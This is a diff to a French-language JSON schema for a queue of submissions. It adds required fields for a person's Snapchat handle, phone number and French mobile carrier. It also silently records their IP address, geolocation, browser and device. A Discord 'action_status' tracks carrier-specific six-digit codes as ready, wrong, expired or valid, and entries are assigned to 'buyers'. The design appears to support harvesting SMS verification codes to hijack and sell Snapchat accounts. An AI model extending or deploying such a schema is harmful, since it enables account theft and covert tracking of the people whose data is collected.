@@ -6,13 +6,46 @@
       "type": "integer",
       "description": "Numero unique d'ordre dans la file"
     },
+    "snapchat": {
+      "type": "string",
+      "description": "Pseudo Snapchat du demandeur"
+    },
+    "telephone": {
+      "type": "string",
+      "description": "Numero de telephone"
+    },
+    "operateur": {
+      "type": "string",
+      "enum": [
+        "SFR",
+        "Bouygues",
+        "Orange"
+      ],
+      "description": "Operateur telephonique"
+    },
     "description": {
       "type": "string",
-      "description": "Description de la demande"
+      "description": "Note ou description optionnelle"
     },
     "file_url": {
       "type": "string",
       "description": "URL du fichier/image uploade (optionnel)"
+    },
+    "ip_address": {
+      "type": "string",
+      "description": "Adresse IP du demandeur"
+    },
+    "country": {
+      "type": "string",
+      "description": "Pays detecte par geolocalisation"
+    },
+    "browser": {
+      "type": "string",
+      "description": "Navigateur utilise"
+    },
+    "device_type": {
+      "type": "string",
+      "description": "Type d'appareil"
     },
     "status": {
       "type": "string",
@@ -26,6 +59,10 @@
       "default": "waiting",
       "description": "Statut de la soumission"
     },
+    "action_status": {
+      "type": "string",
+      "description": "Statut d'action Discord (code_ready, code6_ready, code6sfr_ready, code6orange_ready, code_wrong, code_expired, waiting_queue, code_valid, blacklisted)"
+    },
     "submitted_by_name": {
       "type": "string",
       "description": "Nom du deposant"
@@ -33,6 +70,14 @@
     "submitted_by_contact": {
       "type": "string",
       "description": "Contact du deposant (optionnel)"
+    },
+    "assigned_to_id": {
+      "type": "string",
+      "description": "ID du buyer assigne par le owner"
+    },
+    "assigned_to_name": {
+      "type": "string",
+      "description": "Nom du buyer assigne"
     },
     "claimed_by_id": {
       "type": "string",
@@ -55,6 +100,8 @@
   },
   "required": [
     "queue_number",
-    "description"
+    "snapchat",
+    "telephone",
+    "operateur"
   ]
 }
